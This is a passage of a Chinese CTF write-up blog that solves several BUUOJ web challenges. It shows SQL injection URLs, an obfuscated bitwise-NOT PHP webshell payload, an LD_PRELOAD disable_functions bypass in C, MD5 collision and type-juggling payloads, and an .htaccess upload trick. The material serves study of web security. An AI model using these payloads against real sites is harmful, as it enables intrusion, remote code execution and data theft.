alt="image-20210526212308444"></p></li><li><p>爆字段</p><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//2220f5ea-6d14-4afe-968d-a231b7f532ed.node3.buuoj.cn/index.php?id=' union select 1,(select group_concat(column_name)from(information_schema.columns) where table_name="fl4g"),3%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210526212434855.png" alt="image-20210526212434855"></p></li></ul><ul><li><p>得到数据</p><pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//2220f5ea-6d14-4afe-968d-a231b7f532ed.node3.buuoj.cn/index.php?id=' union select 1,(select group_concat(fllllag) from note.fl4g ),3%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210526212624891.png" alt="image-20210526212624891"></p></li></ul><h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">n1book{union_select_is_so_cool}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="极客大挑战-2019-RCE-ME（这是一道很有趣的rce）"><a href="#极客大挑战-2019-RCE-ME（这是一道很有趣的rce）" class="headerlink" title="[极客大挑战 2019]RCE ME（这是一道很有趣的rce）"></a>[极客大挑战 2019]RCE ME（这是一道很有趣的rce）</h2><h3 id="取反绕过无字母数字的限制"><a href="#取反绕过无字母数字的限制" class="headerlink" title="取反绕过无字母数字的限制"></a>取反绕过无字母数字的限制</h3><blockquote><p>rce 无字母数字的命令执行一般有三种</p><p>1、取反</p><p>2、异或</p><p>3、或运算</p></blockquote><p>其中，取反实现最为简单，一般情况下命令也最短，是首要选择</p><p>异或实现复杂，命令长，除非<code>~</code>被过滤，否则不考虑</p><p>或运算介于二者之间，但或运算需要构造脚本，同样麻烦</p><p>这里没有过滤~，所以使用取反来执行命令</p><p>php脚本</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'(eval($_POST["a"]))'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="两个概念"><a href="#两个概念" class="headerlink" title="两个概念"></a>两个概念</h4><ul><li><code>~</code>取反的原理</li></ul><blockquote><p><code>~</code>php中它的作用是对内容的二进制数取反</p><p>例如：10011100</p><p>这是一串我随意写的二进制数，无任何意义，使用<code>~</code>，即会对它的每位二进制进行取反操作，这个学过C的朋友应该都知道</p><p>即 ~10011100 == 01100011 </p></blockquote><ul><li>php7版本的函数执行</li></ul><blockquote><p>7版本不同于7一下的版本</p><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。</p><p>所以在7版本中，就存在了使用(phpinfo)();执行命令的可能</p><p>而7以下的版本则不行，需要通过<code>. file</code>执行文件并配合通配符规则进行无字母数字的命令执行</p><p>如将文件路径写为：<code>. /???/???/???.???</code></p><p>当然这样写有很大的重名率，所以在配合<code>[^a]</code>除a以外和<code>[@-[]</code> 匹配 @-[之间的字符，@和[都是使用ascii值匹配，这里表示匹配大写字母</p><p>最后将命令写入文件中，上传至服务器，使用<code>. file</code>访问执行即可，<code>. file</code> 执行文件，不需要文件本身有可执行权限</p></blockquote><p>本题使用的便是php7执行动态函数的原理</p><h3 id="查询phpinfo收集信息及构造命令连接一句话"><a href="#查询phpinfo收集信息及构造命令连接一句话" class="headerlink" title="查询phpinfo收集信息及构造命令连接一句话"></a>查询phpinfo收集信息及构造命令连接一句话</h3><ul><li><p>查询phpinfo()；</p><p>  phpinfo中包含了许多的隐私信息，其中和本题直接相关的，是disable_function，函数禁用信息</p><p>  <img src="image-20210531184835223.png" alt="image-20210531184835223"></p></li><li><p>构造一句话连接</p></li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'(eval($_POST["a"]))'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#  结果：</span><span class="token shell-comment comment">#  %9E%8C%8C%9A%8D%8B</span><span class="token shell-comment comment">#  %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">9E</span><span class="token operator">%</span><span class="token constant">8C</span><span class="token operator">%</span><span class="token constant">8C</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token constant">8D</span><span class="token operator">%</span><span class="token constant">8B</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token constant">9E</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token constant">DD</span><span class="token operator">%</span><span class="token constant">9E</span><span class="token operator">%</span><span class="token constant">DD</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//?code=(assert)((eval($_POST["a"])));</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>经过php7的动态函数调用，等同于assert(eval($_POST[“a”]));</strong></p><p><strong>注意：</strong></p><p><strong>这里需要使用assert断言函数执行命令而不是直接eval函数执行命名</strong></p><p><strong>我不知道为什么，希望知道的师傅留言给我</strong></p><p>然后蚁剑连接即可</p><p><img src="image-20210531184943053.png" alt="image-20210531184943053"></p><p>连接后我们是不能直接查看flag的，因为disable_function没有绕过</p><h3 id="蚁剑绕过disable-function"><a href="#蚁剑绕过disable-function" class="headerlink" title="蚁剑绕过disable_function"></a>蚁剑绕过disable_function</h3><p>下载蚁剑插件加载</p><p><img src="image-20210531185125124.png" alt="image-20210531185125124"></p><p>选择模式</p><p><img src="image-20210531185231084.png" alt="image-20210531185231084"></p><p>这里网上许多wp说选择LD模式，可我这里会发生错误，经过我一个个试发现，PHP7_GC_UAF模式可用</p><p>选择后直接开始，cd至根目录，执行命令/readflag即可</p><p><img src="image-20210531185517252.png" alt="image-20210531185517252"></p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//17966f92-e44f-44b1-a1c5-60057e8aefe3.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%C4);</span><span class="token constant">POST</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> //readflag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{ca4a67fd-cf8d-412b-acc9-efd05daefd09}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h3><p>这里可以看出题人自己写的博客</p><p><a href="https://evoa.me/archives/16/">https://evoa.me/archives/16/</a></p><p>简单来说，就是先找到一个可以调用能在运行时候启动子进程的函数，例如用于发送文件的mail()函数</p><p>然后写一个C脚本（C语言是php的底层代码）</p><p>用C脚本改写mail()函数在运行时调用的函数</p><p>这里直接贴出大佬的代码</p><p>这里可以直接看大佬的文章</p><p><a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / > /tmp/sky"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//编译</span><span class="token comment" spellcheck="true">//gcc -c -fPIC hack.c -o hack</span><span class="token comment" spellcheck="true">//gcc --share hack -o hack.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行脚本</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./hack.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>懂了，不会用，只好以后学了更多东西之后试了</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>参考链接</p><p><a href="https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/">https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/</a></p><p>MD5碰撞大致分为三种</p><h4 id="字符串0e绕过"><a href="#字符串0e绕过" class="headerlink" title="字符串0e绕过"></a>字符串0e绕过</h4><p>当md5值在php中是使用==或者!=判断时，存在这个漏洞</p><p>php会将0e解释为0的x次方，结果为0</p><p>一些字符串在md5加密后是以0E开头，便会造成这个漏洞</p><pre><code>s878926199a  0e545993274517709034328855841020  s155964671a  0e342768416822451524974117254469  s214587387a  0e848240448830537924465865611904  s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a</code></pre><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>为了避免上述的漏洞，开发人员一般都使用===对md5值进行判断，这样的确可以有效避免0E漏洞</p><p>但php的md5()函数无法解析数组，接收数组时默认值为0，所以传入数组即可绕过===</p><pre><code>?id[]=1&amp;gg[]=2</code></pre><p><img src="image-20210601124012640.png" alt="image-20210601124012640"></p><h4 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h4><p>为了应付上述的两种情况，一般使用强制转化的方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>     <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同时使用强制字符串转化和===，这时前两种方法就都无法使用了，只能用真实碰撞</p><p>md5的加密方式虽然不可逆，但会存在字符串碰撞的问题，虽然概率极低。我们叫它真实碰撞</p><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/131283811">https://zhuanlan.zhihu.com/p/131283811</a></p><p>自己强行爆破肯定行不通，所以这里我们使用已有的工具</p><p>下载工具，新建1.txt 内容为1，打开cmd运行命令</p><pre class="line-numbers language-cmd"><code class="language-cmd">fastcoll_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210601125310752.png" alt="image-20210601125310752"></p><p>运行php脚本，读取得到的文件并转化为url编码上传</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">function</span>  <span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'二进制hash:'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'url编码:'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'url hash:'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\r\n\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'二进制hash:'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string">'url编码:'</span><span class="token punctuation">.</span>  <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'url hash:'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功：</p><p><img src="image-20210601130446359.png" alt="image-20210601130446359"></p><h3 id="对-和-的类型绕过"><a href="#对-和-的类型绕过" class="headerlink" title="对== 和!= 的类型绕过"></a>对== 和!= 的类型绕过</h3><p>下一步，题目要求POST传参一个密码，值为1234567，但传参不能是数字</p><p><img src="image-20210601130846644.png" alt="image-20210601130846644"></p><p>在1234567后任意输入非数字字符，将它从整形改为字符型即可，这里我推荐使用%00</p><p><img src="image-20210601131007877.png" alt="image-20210601131007877"></p><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">http://b76c8ae6-00d3-45ee-a963-f52aa201e859.node3.buuoj.cn/?id=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B2%EB%FA%AE%7FR%40%9A%80%05A%0BV%5C%9E%0D%D4%13%D0c%E0%99U%DD5%96z%0A%D3%A7%918%C6%E3%13%CD%80%8C%851%EF%0D%3B%3A%F8%DF%07%BC%EC%FD%05%9E%94%2Fv%A8%91z%ADW%BA%C7%18%0A%A9s%21K%ED+%97C%D5%3D%159%DB%E0%F7%02%C1%E1%28GH%9A%91%F8%29%B3%00p%17%60%88%C7%D7%D3B%08%AF%C3%81%16z%00R%9C%C2g%FD%CDFT%F5n%7F%82%3F%BD%40%C8%D7%C1V%E8%CDT&gg=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B2%EB%FA%AE%7FR%40%9A%80%05A%0BV%5C%9E%0D%D4%13%D0%E3%E0%99U%DD5%96z%0A%D3%A7%918%C6%E3%13%CD%80%8C%851%EF%0D%3B%3A%F8_%08%BC%EC%FD%05%9E%94%2Fv%A8%91z%AD%D7%BA%C7%18%0A%A9s%21K%ED+%97C%D5%3D%159%DB%E0%F7%02%C1%E1%28%C7H%9A%91%F8%29%B3%00p%17%60%88%C7%D7%D3B%08%AF%C3%81%16z%00R%9C%C2%E7%FC%CDFT%F5n%7F%82%3F%BD%40%C8%D7AV%E8%CDTpasswd=1234567%00或者：http://b76c8ae6-00d3-45ee-a963-f52aa201e859.node3.buuoj.cn/?id[]=1&gg[]=2passwd=1234567%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{2ad589d4-ee27-4bd0-a7c9-143ae3d4729e}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h3 id="文件上传，请求伪造"><a href="#文件上传，请求伪造" class="headerlink" title="文件上传，请求伪造"></a>文件上传，请求伪造</h3><p>这道题明显是先让我们上传一个一句话木马</p><p>直接上传一个1.php，burp抓包，先直接放包看看</p><p><img src="image-20210601160550731.png" alt="image-20210601160550731"></p><p>直觉告诉我是对文件后缀和类型的检测，直接在burp改数据</p><p><img src="image-20210601160726975.png" alt="image-20210601160726975"></p><p>成功，猜测正确</p><p>这时候我们上传的只是一个图片，没有解析，所以再试着上传.htaccess文件</p><p>先直接在重发器改名试试</p><p><img src="image-20210601160939995.png" alt="image-20210601160939995"></p><p>成功，说明允许上传.htaccess文件</p><p>编写htaccess文件上传</p><pre class="line-numbers language-htaccess"><code class="language-htaccess">SetHandler   application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210601161205386.png" alt="image-20210601161205386"></p><p>成功</p><p><img src="image-20210601161218574.png" alt="image-20210601161218574"></p><h3 id="认识disable-function"><a href="#认识disable-function" class="headerlink" title="认识disable_function"></a>认识disable_function</h3><p>访问木马文件</p><p><img src="image-20210601161336742.png" alt="image-20210601161336742"></p><p>成功</p><p>看看phpinfo();里有什么我们需要知道的信息</p><p>我们想通过木马执行命令，首先要看的就是disable_function 函数禁用</p><p><img src="image-20210601161808848.png" alt="image-20210601161808848"></p><p>可以看到这道题禁用了很多可以执行命令的函数，我自己是想不到用什么来执行了，所以直接蚁剑</p><p>拿到flag</p><p><img src="image-20210601162451147.png" alt="image-20210601162451147"></p><h3 id="flag-14"><a href="#flag-14" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{829ab6a4-7198-457a-8256-c98a3f9ca279}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><h3 id="ip伪造"><a href="#ip伪造" class="headerlink" title="ip伪造"></a>ip伪造</h3><p>查看源码，有个flag.php</p><p>访问他</p><p><img src="image-20210601172823591.png" alt="image-20210601172823591"></p><p>这里说保存了购买者ip，只有够买者和自己能看到</p><p>然后他在之前说成功案例，成功把我坑进去了</p><p>这里伪造ip为127.0.0.1访问flag.php即可</p><p><img src="image-20210601173044257.png" alt="image-20210601173044257"></p><h3 id="flag-15"><a href="#flag-15" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{fdd65d46-7350-4fab-9cd5-ab4129cbdba6}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DS-Store-文件"><a href="#DS-Store-文件" class="headerlink" title=".DS_Store 文件"></a>.DS_Store 文件</h3><p>既然提到我被绕了进去，就顺便说说这个知识点</p><p><img src="image-20210601173235742.png" alt="image-20210601173235742"></p><p>这里说小A买了flag，于是我到misc看了下，发现有个.DS_Store文件，用awvs扫描目录，发现这道题有很多的.DS_Store文件</p><p>先说说.DS_Store文件是什么</p><blockquote><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存储目录的自定义属性，例如文件的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。</p><p>上面是这个文件的定义，但我们不需要过多了解这些，我们应该知道的是</p><p>这个文件会造成网站的目录泄露，通过这个文件，我们可以知道目录的清单</p></blockquote><p>.DS_Store可以用linux系统查看或者下载Python-dsstore工具，也可以查看二进制文件（比较麻烦）</p><p>下载地址：</p><pre><code>https://github.com/gehaxelt/Python-dsstore</code></pre><p>在本题我扫到了四个.DS_Store文件</p><p><img src="image-20210601174348694.png" alt="image-20210601174348694"></p><p>这道题看这些没什么意义，我就选最易看的说吧</p><p>比如： <a href="http://node3.buuoj.cn:27314/img/.DS_Store">http://node3.buuoj.cn:27314/img/.DS_Store</a> </p><p>这个.DS_Store文件在img目录下，我们可以通过它得到这个目录的信息</p><p><img src="image-20210601174738332.png" alt="image-20210601174738332"></p><p>一般访问就能下载它</p><p><img src="image-20210601174857917.png" alt="image-20210601174857917"></p><p>可以看到header.png等字样，随机选一个去访问</p><p><img src="image-20210601175002936.png" alt="image-20210601175002936"></p><p>访问成功</p><p>虽然这只是一个小插曲，但我们需要懂得它</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>名副其实的套娃</p><h3 id="字符串及正则绕过"><a href="#字符串及正则绕过" class="headerlink" title="字符串及正则绕过"></a>字符串及正则绕过</h3><p>进入后查看源代码</p><p><img src="image-20210602165334106.png" alt="image-20210602165334106"></p><p>$_SERVER[‘QUERY_STRING’] 获取请求字符串，以SERVER传给变量query</p><p>这里，我们首先要知道超全局变量的概念</p><p><img src="image-20210602165618649.png" alt="image-20210602165618649"></p><p>我们平时最常用的<code>$_POST</code>,<code>$_GET</code>都是其中的一员</p><ul><li><p>超全局变量</p><p>  超全局变量是在全部作用域中始终可用的内置变量</p></li></ul><p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 <strong>global $variable;</strong> 就可以访问它们。</p><h4 id="QUERY-STRING-请求字符串详解"><a href="#QUERY-STRING-请求字符串详解" class="headerlink" title="QUERY_STRING 请求字符串详解"></a>QUERY_STRING 请求字符串详解</h4><p>首先将<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>的值赋给变量<code>$query</code><br>关于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的值：</p><blockquote><p>1，<a href="http://localhost/aaa/">http://localhost/aaa/</a> (打开aaa中的index.php)<br>结果：</p></blockquote><p>$_SERVER[‘QUERY_STRING’] = “”;<br>$_SERVER[‘REQUEST_URI’] = “/aaa/“;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’] = “/aaa/index.php”;</p><blockquote><p>2，<a href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> (附带查询)</p></blockquote><p>结果：<br>$_SERVER[‘QUERY_STRING’] = “p=222”;<br>$_SERVER[‘REQUEST_URI’] = “/aaa/?p=222”;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’] = “/aaa/index.php”;</p><blockquote><p>3，<a href="http://localhost/aaa/index.php?p=222&amp;q=333">http://localhost/aaa/index.php?p=222&amp;q=333</a></p></blockquote><p>结果：<br>$_SERVER[‘QUERY_STRING’] = “p=222&amp;q=333”;<br>$_SERVER[‘REQUEST_URI’] = “/aaa/index.php?p=222&amp;q=333”;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’] = “/aaa/index.php”;</p><blockquote><p>由实例可知：</p></blockquote><p>$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值<br>$_SERVER[“REQUEST_URI”] 获取 <a href="http://localhost/">http://localhost</a> 后面的值，包括/<br>$_SERVER[“SCRIPT_NAME”] 获取当前脚本的路径，如：index.php<br>$_SERVER[“PHP_SELF”] 当前正在执行脚本的文件名</p><p>此段原文地址：<a href="https://www.cnblogs.com/mitang/p/3874291.html">https://www.cnblogs.com/mitang/p/3874291.html</a></p><p><strong>可见QUERY_STRING获取的是？后的所有内容</strong></p><h4 id="bypass-substr-count"><a href="#bypass-substr-count" class="headerlink" title="bypass substr_count()"></a>bypass 